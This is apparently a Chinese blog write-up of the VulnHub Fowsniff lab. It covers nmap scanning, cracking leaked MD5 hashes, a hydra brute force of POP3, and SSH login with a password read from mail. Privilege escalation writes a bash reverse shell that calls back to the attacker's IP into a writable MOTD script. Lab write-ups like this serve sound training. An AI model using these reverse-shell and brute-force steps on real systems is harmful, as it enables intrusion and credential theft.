+++
date = '2026-11-13T19:52:05+08:00'
draft = false
title = '[VulnHub靶机]Fowsniff渗透记录'
tags = ['渗透','Vulnhub','信息收集','pop3']
categories = ["靶机渗透"]
+++

## 主机发现&端口扫描

攻击机IP: 10.10.10.3  
靶机IP: 10.10.10.17

```shell
┌──(kali㉿kali)-[~/Fowsniff]
└─$ sudo arp-scan -l
Interface: eth0, type: EN10MB, MAC: 00:0c:29:5f:ca:d5, IPv4: 10.10.10.3
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
10.10.10.1      00:50:56:c0:00:08       VMware, Inc.
10.10.10.2      00:50:56:fc:41:2a       VMware, Inc.
10.10.10.17     00:0c:29:7c:d7:90       VMware, Inc.
10.10.10.254    00:50:56:f8:1d:31       VMware, Inc.

4 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.10.0: 256 hosts scanned in 1.965 seconds (130.28 hosts/sec). 4 responded
```

探测端口开放情况

```shell
┌──(kali㉿kali)-[~/Fowsniff]
└─$ sudo nmap -sT --min-rate 10000 -p- 10.10.10.17                                    
Starting Nmap 7.991 ( https://nmap.org ) at 2026-11-13 20:05 +0800
Nmap scan report for 10.10.10.17
Host is up (0.00063s latency).
Not shown: 65531 closed tcp ports (conn-refused)
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
110/tcp open  pop3
143/tcp open  imap
MAC Address: 00:0C:29:7C:D7:90 (VMware)

Nmap done: 1 IP address (1 host up) scanned in 1.83 seconds
```

详细扫描

```shell
┌──(kali㉿kali)-[~/Fowsniff]
└─$ sudo nmap -sT -sV -sC -O -p22,80,110,143 10.10.10.17
Starting Nmap 7.991 ( https://nmap.org ) at 2026-11-13 20:06 +0800
Nmap scan report for 10.10.10.17
Host is up (0.00054s latency).

PORT    STATE SERVICE VERSION
22/tcp  open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 90:35:66:f4:c6:d2:95:12:1b:e8:cd:de:aa:4e:03:23 (RSA)
|   256 53:9d:23:67:34:cf:0a:d5:5a:9a:11:74:bd:fd:de:71 (ECDSA)
|_  256 a2:8f:db:ae:9e:3d:c9:e6:a9:ca:03:b1:d7:1b:66:83 (ED25519)
80/tcp  open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Fowsniff Corp - Delivering Solutions
| http-robots.txt: 1 disallowed entry
|_/
110/tcp open  pop3
|_pop3-capabilities: AUTH-RESP-CODE SASL(PLAIN) USER UIDL RESP-CODES TOP PIPELINING CAPA
| fingerprint-strings:
|   LANDesk-RC:
|     +OK Welcome to the Fowsniff Corporate Mail Server!
|   SIPOptions:
|     +OK Welcome to the Fowsniff Corporate Mail Server!
|     -ERR Unknown command.
|     -ERR Unknown command.
|     -ERR Unknown command.
|_    -ERR Too many invalid bad commands.
143/tcp open  imap    Dovecot imapd
|_imap-capabilities: LITERAL+ OK LOGIN-REFERRALS IDLE AUTH=PLAINA0001 ID more ENABLE capabilities listed SASL-IR post-login IMAP4rev1 Pre-login have
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port110-TCP:V=7.991%I=7%D=11/13%Time=6AF6FDB5%P=x86_64-pc-linux-gnu%r(S
SF:IPOptions,9E,"\+OK\x20Welcome\x20to\x20the\x20Fowsniff\x20Corporate\x20
SF:Mail\x20Server!\r\n-ERR\x20Unknown\x20command\.\r\n-ERR\x20Unknown\x20c
SF:ommand\.\r\n-ERR\x20Unknown\x20command\.\r\n-ERR\x20Too\x20many\x20inva
SF:lid\x20bad\x20commands\.\r\n")%r(LANDesk-RC,34,"\+OK\x20Welcome\x20to\x
SF:20the\x20Fowsniff\x20Corporate\x20Mail\x20Server!\r\n");
MAC Address: 00:0C:29:7C:D7:90 (VMware)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 3.2 - 4.14 (95%), Linux 3.10 - 4.11 (93%), Linux 3.18 (93%), OpenWrt Chaos Calmer 15.05 (Linux 3.18) or Designated Driver (Linux 4.1 or 4.4) (92%), Sony Android TV (Android 5.0) (92%), Android 5.1 (92%), Linux 3.2 - 3.16 (92%), Linux 4.4 (92%), Linux 3.8 - 3.16 (92%), Android 4.0 (91%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 111.86 seconds
```

漏洞扫描

```shell
┌──(kali㉿kali)-[~/Fowsniff]
└─$ sudo nmap --script=vuln -p22,80,110,143 10.10.10.17
Starting Nmap 7.991 ( https://nmap.org ) at 2026-11-13 20:11 +0800
Nmap scan report for 10.10.10.17
Host is up (0.00032s latency).

PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
|_http-csrf: Couldn't find any CSRF vulnerabilities.
| http-enum:
|   /robots.txt: Robots file
|   /README.txt: Interesting, a readme.
|_  /images/: Potentially interesting directory w/ listing on 'apache/2.4.18 (ubuntu)'
|_http-dombased-xss: Couldn't find any DOM based XSS.
|_http-sql-injection: ERROR: Script execution failed (use -d to debug)
| http-internal-ip-disclosure:
|_  Internal IP Leaked: 127.0.1.1
| http-slowloris-check:
|   VULNERABLE:
|   Slowloris DOS attack
|     State: LIKELY VULNERABLE
|     IDs:  CVE:CVE-2007-6750
|       Slowloris tries to keep many connections to the target web server open and hold
|       them open as long as possible.  It accomplishes this by opening connections to
|       the target web server and sending a partial request. By doing so, it starves
|       the http server's resources causing Denial Of Service.
|
|     Disclosure date: 2009-09-17
|     References:
|       http://ha.ckers.org/slowloris/
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
110/tcp open  pop3
143/tcp open  imap
MAC Address: 00:0C:29:7C:D7:90 (VMware)

Nmap done: 1 IP address (1 host up) scanned in 322.03 seconds
```

## Web渗透

浏览器访问80端口, 阅读内容可知该机器曾被攻陷, 攻击者很可能拿到了用户名和密码, 并劫持了官方推特(@fowsniffcorp), 可能会发布敏感信息

![](https://cdn.jsdelivr.net/gh/Pieyue/blog_images@main/%E9%9D%B6%E6%9C%BA/Fowsniff/%E8%AE%BF%E9%97%AE80%E7%AB%AF%E5%8F%A3.avif)

访问robots.txt, 没有任何信息

```text
User-agent: *
Disallow: /
```

访问README.txt

```text
Escape Velocity by HTML5 UP
html5up.net | @ajlkn
Free for personal and commercial use under the CCA 3.0 license (html5up.net/license)


A new responsive template featuring a flat (but not too flat) minimalistic design, spacious
layout, and styling for all basic page elements. Its demo images* are courtesy of the supremely
talented photographer Felicia Simion. If you like photography or just enjoy being blown away by
awesome stuff, check out her portfolio for more stunning images:

http://ineedchemicalx.deviantart.com/

(* = Not included! Only meant for use with my own on-site demo, so please do NOT download
and/or use any of Felicia's work without her explicit permission!)

Feedback, bug reports, and comments are not only welcome, but strongly encouraged :)

AJ
aj@lkn.io | @ajlkn

PS: Not sure how to get that contact form working? Give formspree.io a try (it's awesome).


Credits:

	Demo Images:
		Felicia Simion (ineedchemicalx.deviantart.com)

	Icons:
		Font Awesome (fortawesome.github.com/Font-Awesome)

	Other:
		jQuery (jquery.com)
		html5shiv.js (@afarkas @jdalton @jon_neal @rem)
		CSS3 Pie (css3pie.com)
		background-size polyfill (github.com/louisremi)
		Respond.js (j.mp/respondjs)
		jquery.dropotron (@ajlkn)
		Skel (skel.io)
```

网站目录爆破, 发现/security.txt

```shell
┌──(kali㉿kali)-[~/Fowsniff]
└─$ dirsearch -u http://10.10.10.17/ -i 200,301,302,500

  _|. _ _  _  _  _ _|_    v0.4.4
 (_||| _) (/_(_|| (_| )

Extensions: php, asp, aspx, jsp, html, htm | HTTP method: GET | Threads: 25
Wordlist size: 12295

Target: http://10.10.10.17/

[20:19:44] Scanning: 
[20:19:49] 301 -   311B - /assets  ->  http://10.10.10.17/assets/           
[20:19:49] 200 -    1KB - /assets/
[20:19:52] 301 -   311B - /images  ->  http://10.10.10.17/images/           
[20:19:52] 200 -    1KB - /images/
[20:19:52] 200 -    3KB - /index.html                                       
[20:19:53] 200 -   17KB - /LICENSE.txt                                      
[20:19:55] 200 -    1KB - /README.txt                                       
[20:19:55] 200 -    26B - /robots.txt                                       
[20:19:55] 200 -   459B - /security.txt                                     
                                                                             
Task Completed
```

访问得知, 该主机(FOWSNIFF)已被B1gN1nj4攻陷

```text
       WHAT SECURITY?

            ''~``
           ( o o )
+-----.oooO--(_)--Oooo.------+
|                            |
|          FOWSNIFF          |
|            got             |
|           PWN3D!!!         |
|                            |
|       .oooO                |
|        (   )   Oooo.       |
+---------\ (----(   )-------+
           \_)    ) /
                 (_/


Fowsniff Corp got pwn3d by B1gN1nj4!


No one is safe from my 1337 skillz!
```

在推特上搜索用户`fowsniffcorp`, 发现它发布的帖子

![](https://cdn.jsdelivr.net/gh/Pieyue/blog_images@main/%E9%9D%B6%E6%9C%BA/Fowsniff/%E6%8E%A8%E7%89%B9%E6%9F%A5%E8%AF%A2.avif)

访问却发现404

![](https://cdn.jsdelivr.net/gh/Pieyue/blog_images@main/%E9%9D%B6%E6%9C%BA/Fowsniff/%E9%93%BE%E6%8E%A5%E8%A2%AB%E5%88%A0%E9%99%A4.avif)

使用互联网档案馆查询页面历史快照, 最终得到下面的信息

```text
FOWSNIFF CORP PASSWORD LEAK
            ''~``
           ( o o )
+-----.oooO--(_)--Oooo.------+
|                            |
|          FOWSNIFF          |
|            got             |
|           PWN3D!!!         |
|                            |         
|       .oooO                |         
|        (   )   Oooo.       |         
+---------\ (----(   )-------+
           \_)    ) /
                 (_/
FowSniff Corp got pwn3d by B1gN1nj4!
No one is safe from my 1337 skillz!


mauer@fowsniff:8a28a94a588a95b80163709ab4313aa4
mustikka@fowsniff:ae1644dac5b77c0cf51e0d26ad6d7e56
tegel@fowsniff:1dc352435fecca338acfd4be10984009
baksteen@fowsniff:19f5af754c31f1e2651edde9250d69bb
seina@fowsniff:90dc16d47114aa13671c697fd506cf26
stone@fowsniff:a92b8a29ef1183192e3d35187e0cfabd
mursten@fowsniff:0e9588cb62f4b6f27e33d449e2ba0b3b
parede@fowsniff:4d6e42f56e127803285a0a7649b5ab11
sciana@fowsniff:f7fd98d380735e859f8b2ffbbede5a7e

Fowsniff Corporation Passwords LEAKED!
FOWSNIFF CORP PASSWORD DUMP!

Here are their email passwords dumped from their databases.
They left their pop3 server WIDE OPEN, too!

MD5 is insecure, so you shouldn't have trouble cracking them but I was too lazy haha =P

l8r n00bz!

B1gN1nj4

-------------------------------------------------------------------------------------------------
This list is entirely fictional and is part of a Capture the Flag educational challenge.

All information contained within is invented solely for this purpose and does not correspond
to any real persons or organizations.

Any similarities to actual people or entities is purely coincidental and occurred accidentally.
```

使用somd5查询这些哈希, 得到以下的凭据

| 用户名 | 密码 |
| ----- | ---- |
| mauer | mailcall |
| mustikka | bilbo101 |
| tegel | apples01 |
| baksteen | skyler22 |
| seina | scoobydoo2 |
| stone | 未查到 |
| mursten | carp4ever |
| parede | orlando12 |
| sciana | 07011972 |

然而使用crackmapexec尝试登录SSH并没有试出任何有效凭据

## pop3信息收集

Nmap的扫描结果显示开靶机放了pop3服务, 使用hydra和凭据尝试爆破pop3服务, 发现1组有效凭据

```shell
┌──(kali㉿kali)-[~/Fowsniff]
└─$ hydra -L username.list -P passwd.list pop3://10.10.10.17/             
Hydra v9.7 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-11-14 19:37:17
[INFO] several providers have implemented cracking protection, check with a small wordlist first - and stay legal!
[DATA] max 16 tasks per 1 server, overall 16 tasks, 81 login tries (l:9/p:9), ~6 tries per task
[DATA] attacking pop3://10.10.10.17:110/
[110][pop3] host: 10.10.10.17   login: seina   password: scoobydoo2
[STATUS] 81.00 tries/min, 81 tries in 00:01h, 1 to do in 00:01h, 1 active
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-11-14 19:38:25
```

使用nc连接pop3服务器, 用`USER`和`PASS`命令登录

```shell
┌──(kali㉿kali)-[~/Fowsniff]
└─$ nc 10.10.10.17 110
+OK Welcome to the Fowsniff Corporate Mail Server!
USER seina
+OK
PASS scoobydoo2
+OK Logged in.
```

使用`STAT`命令查看邮件总数和总大小

```shell
STAT
+OK 2 2902
```

使用`LIST`命令列出每封邮件的编号和大小

```shell
LIST
+OK 2 messages:
1 1622
2 1280
.
```

使用`RETR`获取邮件内容, 从第一封邮件可知, 可以使用临时密码`S1ck3nBluff+secureshell`登录SSH

```text
+OK 1622 octets
Return-Path: <stone@fowsniff>
X-Original-To: seina@fowsniff
Delivered-To: seina@fowsniff
Received: by fowsniff (Postfix, from userid 1000)
        id 0FA3916A; Tue, 13 Mar 2018 14:51:07 -0400 (EDT)
To: baksteen@fowsniff, mauer@fowsniff, mursten@fowsniff,
    mustikka@fowsniff, parede@fowsniff, sciana@fowsniff, seina@fowsniff,
    tegel@fowsniff
Subject: URGENT! Security EVENT!
Message-Id: <20180313185107.0FA3916A@fowsniff>
Date: Tue, 13 Mar 2018 14:51:07 -0400 (EDT)
From: stone@fowsniff (stone)

Dear All,

A few days ago, a malicious actor was able to gain entry to
our internal email systems. The attacker was able to exploit
incorrectly filtered escape characters within our SQL database
to access our login credentials. Both the SQL and authentication
system used legacy methods that had not been updated in some time.

We have been instructed to perform a complete internal system
overhaul. While the main systems are "in the shop," we have
moved to this isolated, temporary server that has minimal
functionality.

This server is capable of sending and receiving emails, but only
locally. That means you can only send emails to other users, not
to the world wide web. You can, however, access this system via
the SSH protocol.

The temporary password for SSH is "S1ck3nBluff+secureshell"

You MUST change this password as soon as possible, and you will do so under my
guidance. I saw the leak the attacker posted online, and I must say that your
passwords were not very secure.

Come see me in my office at your earliest convenience and we'll set it up.

Thanks,
A.J Stone
```

查看邮件2, 得知`baksteen`正在度假

```text
RETR 2
+OK 1280 octets                                     
Return-Path: <baksteen@fowsniff>                    
X-Original-To: seina@fowsniff                       
Delivered-To: seina@fowsniff                        
Received: by fowsniff (Postfix, from userid 1004)
        id 101CA1AC2; Tue, 13 Mar 2018 14:54:05 -0400 (EDT)                                             
To: seina@fowsniff                                  
Subject: You missed out!                            
Message-Id: <20180313185405.101CA1AC2@fowsniff>
Date: Tue, 13 Mar 2018 14:54:05 -0400 (EDT)
From: baksteen@fowsniff                             

Devin,                                              

You should have seen the brass lay into AJ today!
We are going to be talking about this one for a looooong time hahaha.                                   
Who knew the regional manager had been in the navy? She was swearing like a sailor!                     

I don't know what kind of pneumonia or something you brought back with                                  
you from your camping trip, but I think I'm coming down with it myself.                                 
How long have you been gone - a week?
Next time you're going to get sick and miss the managerial blowout of the century,                      
at least keep it to yourself!                       

I'm going to head home early and eat some chicken soup.                                                 
I think I just got an email from Stone, too, but it's probably just some                                
"Let me explain the tone of my meeting with management" face-saving mail.                               
I'll read it when I get back.                       

Feel better,                                        

Skyler                                              

PS: Make sure you change your email password. 
AJ had been telling us to do that right before Captain Profanity showed up.
```

尝试使用用户名`baksteen`密码`S1ck3nBluff+secureshell`登录SSH

```shell
┌──(kali㉿kali)-[~/Fowsniff]
└─$ ssh baksteen@10.10.10.17      
The authenticity of host '10.10.10.17 (10.10.10.17)' can't be established.
ED25519 key fingerprint is: SHA256:KZLP3ydGPtqtxnZ11SUpIwqMdeOUzGWHV+c3FqcKYg0
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.10.17' (ED25519) to the list of known hosts.
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
baksteen@10.10.10.17's password: 

                            _____                       _  __  __  
      :sdddddddddddddddy+  |  ___|____      _____ _ __ (_)/ _|/ _|  
   :yNMMMMMMMMMMMMMNmhsso  | |_ / _ \ \ /\ / / __| '_ \| | |_| |_   
.sdmmmmmNmmmmmmmNdyssssso  |  _| (_) \ V  V /\__ \ | | | |  _|  _|  
-:      y.      dssssssso  |_|  \___/ \_/\_/ |___/_| |_|_|_| |_|   
-:      y.      dssssssso                ____                      
-:      y.      dssssssso               / ___|___  _ __ _ __        
-:      y.      dssssssso              | |   / _ \| '__| '_ \     
-:      o.      dssssssso              | |__| (_) | |  | |_) |  _  
-:      o.      yssssssso               \____\___/|_|  | .__/  (_) 
-:    .+mdddddddmyyyyyhy:                              |_|        
-: -odMMMMMMMMMMmhhdy/.    
.ohdddddddddddddho:                  Delivering Solutions


   ****  Welcome to the Fowsniff Corporate Server! **** 

              ---------- NOTICE: ----------

 * Due to the recent security breach, we are running on a very minimal system.
 * Contact AJ Stone -IMMEDIATELY- about changing your email and SSH passwords.


Last login: Tue Mar 13 16:55:40 2018 from 192.168.7.36
baksteen@fowsniff:~$ 
```

成功登录

## 权限提升

查找所有我们可写的文件

```shell
baksteen@fowsniff:/etc/cron.d$ find / -writable -type f 2>/dev/null -not -path "/proc/*" 2>/dev/null
/opt/cube/cube.sh
/home/baksteen/.cache/motd.legal-displayed
/home/baksteen/Maildir/dovecot-uidvalidity
/home/baksteen/Maildir/dovecot.index.log
/home/baksteen/Maildir/new/1520967067.V801I23764M196461.fowsniff
/home/baksteen/Maildir/dovecot-uidlist
/home/baksteen/.viminfo
/home/baksteen/.bash_history
/home/baksteen/.lesshsQ
/home/baksteen/.bash_logout
/home/baksteen/term.txt
/home/baksteen/.profile
/home/baksteen/.bashrc
/home/baksteen/test            
/sys/fs/cgroup/memory/cgroup.event_control
/sys/fs/cgroup/systemd/user.slice/user-1004.slice/user@1004.service/tasks
/sys/fs/cgroup/systemd/user.slice/user-1004.slice/user@1004.service/cgroup.procs
/sys/fs/cgroup/systemd/user.slice/user-1004.slice/user@1004.service/init.scope/tasks
/sys/fs/cgroup/systemd/user.slice/user-1004.slice/user@1004.service/init.scope/cgroup.procs
/sys/fs/cgroup/systemd/user.slice/user-1004.slice/user@1004.service/init.scope/cgroup.clone_children
/sys/fs/cgroup/systemd/user.slice/user-1004.slice/user@1004.service/init.scope/notify_on_release
/sys/kernel/security/apparmor/policy/.remove
/sys/kernel/security/apparmor/policy/.replace
/sys/kernel/security/apparmor/policy/.load
/sys/kernel/security/apparmor/.remove
/sys/kernel/security/apparmor/.replace
/sys/kernel/security/apparmor/.load
/sys/kernel/security/apparmor/.ns_name
/sys/kernel/security/apparmor/.ns_level
/sys/kernel/security/apparmor/.ns_stacked
/sys/kernel/security/apparmor/.stacked
/sys/kernel/security/apparmor/.access
```

注意到一个脚本`/opt/cube/cube.sh`, 读取发现它会打印登录时的banner

```sh
printf "
                            _____                       _  __  __
      :sdddddddddddddddy+  |  ___|____      _____ _ __ (_)/ _|/ _|
   :yNMMMMMMMMMMMMMNmhsso  | |_ / _ \ \ /\ / / __| '_ \| | |_| |_
.sdmmmmmNmmmmmmmNdyssssso  |  _| (_) \ V  V /\__ \ | | | |  _|  _|
-:      y.      dssssssso  |_|  \___/ \_/\_/ |___/_| |_|_|_| |_|
-:      y.      dssssssso                ____
-:      y.      dssssssso               / ___|___  _ __ _ __
-:      y.      dssssssso              | |   / _ \| '__| '_ \
-:      o.      dssssssso              | |__| (_) | |  | |_) |  _
-:      o.      yssssssso               \____\___/|_|  | .__/  (_)
-:    .+mdddddddmyyyyyhy:                              |_|
-: -odMMMMMMMMMMmhhdy/.
.ohdddddddddddddho:                  Delivering Solutions\n\n"

```

既然登录时会打印banner, 那么证明登录时该脚本被执行了, 读取`/etc/update-motd.d/00-header`, 果然发现它被执行

```sh
#!/bin/sh
#
#    00-header - create the header of the MOTD
#    Copyright (C) 2009-2010 Canonical Ltd.
#
#    Authors: Dustin Kirkland <kirkland@canonical.com>
#
#    This program is free software; you can redistribute it and/or modify
#    it under the terms of the GNU General Public License as published by
#    the Free Software Foundation; either version 2 of the License, or
#    (at your option) any later version.
#
#    This program is distributed in the hope that it will be useful,
#    but WITHOUT ANY WARRANTY; without even the implied warranty of
#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#    GNU General Public License for more details.
#
#    You should have received a copy of the GNU General Public License along
#    with this program; if not, write to the Free Software Foundation, Inc.,
#    51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.

#[ -r /etc/lsb-release ] && . /etc/lsb-release

#if [ -z "$DISTRIB_DESCRIPTION" ] && [ -x /usr/bin/lsb_release ]; then
#       # Fall back to using the very slow lsb_release utility
#       DISTRIB_DESCRIPTION=$(lsb_release -s -d)
#fi

#printf "Welcome to %s (%s %s %s)\n" "$DISTRIB_DESCRIPTION" "$(uname -o)" "$(uname -r)" "$(uname -m)"

sh /opt/cube/cube.sh
```

`/etc/update-motd.d/00-header`是不可写的, 但cube.sh是可写的, 向其写入提权代码

```sh
/bin/bash -c "/bin/bash -i >&/dev/tcp/10.10.10.3/4444 0>&1"
```

攻击机开启监听, 重新登陆即可提权

```shell
┌──(kali㉿kali)-[~/Fowsniff]
└─$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.10.3] from (UNKNOWN) [10.10.10.17] 37494
bash: cannot set terminal process group (1990): Inappropriate ioctl for device
bash: no job control in this shell
root@fowsniff:/#
```

读取flag

```text
cat flag.txt
   ___                        _        _      _   _             _ 
  / __|___ _ _  __ _ _ _ __ _| |_ _  _| |__ _| |_(_)___ _ _  __| |
 | (__/ _ \ ' \/ _` | '_/ _` |  _| || | / _` |  _| / _ \ ' \(_-<_|
  \___\___/_||_\__, |_| \__,_|\__|\_,_|_\__,_|\__|_\___/_||_/__(_)
               |___/ 

 (_)
  |--------------
  |&&&&&&&&&&&&&&|
  |    R O O T   |
  |    F L A G   |
  |&&&&&&&&&&&&&&|
  |--------------
  |
  |
  |
  |
  |
  |
 ---

Nice work!

This CTF was built with love in every byte by @berzerk0 on Twitter.

Special thanks to psf, @nbulischeck and the whole Fofao Team.
```
